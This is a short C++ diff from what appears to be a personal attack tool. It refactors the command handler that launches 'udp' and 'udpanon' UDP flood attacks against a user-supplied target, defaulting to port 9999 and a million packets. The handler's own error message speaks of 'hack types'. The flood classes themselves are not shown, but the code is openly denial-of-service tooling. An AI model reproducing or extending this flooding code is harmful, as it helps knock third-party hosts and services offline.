@@ -204,8 +204,8 @@ int processCommand(int i) {
 			}
 			if (port == -1) { port = 9999; }
 			if (count == -1) { count = 1000000; }
-			incision::DirectUDPFlood atk(target, port, incision::defaultPayload, cmdContains("--lm"), cmdContains("--hp"));
-			atk.attack();
+			incision::DirectUDPFlood atk(target, port, incision::defaultPayload);
+			atk.attack(cmdContains("--lm"), cmdContains("--hp"));
 		} else if (cmd[1] == "udpanon") {
 			string target = getStringArg("-t");
 			int count = getIntArg("-c");
@@ -216,8 +216,8 @@ int processCommand(int i) {
 			}
 			if (port == -1) { port = 9999; }
 			if (count == -1) { count = 1000000; }
-			incision::AnonymousUDPFlood atk(target, port, incision::defaultPayload, cmdContains("--lm"), cmdContains("--hp"));
-			atk.attack();
+			incision::AnonymousUDPFlood atk(target, port, incision::defaultPayload);
+			atk.attack(cmdContains("--lm"), cmdContains("--hp"));
 		} else {
 			notif::error("Unknown or invalid hack type.");
 		}
@@ -312,7 +312,7 @@ int processCommand(int i) {
 			return 0;
 		}
 	} else if (cmd[0] == "compile" || cmd[0] == "c") {
-		if (cmd[1] == "cpp")
+		if (cmd[1] == "cpp") {}
 	} else if (cmd[0] == "tf") {
 		cout << "-a=" << getIntArg("-a") << endl;
 		cout << "-b=" << getIntArg("-b") << endl;
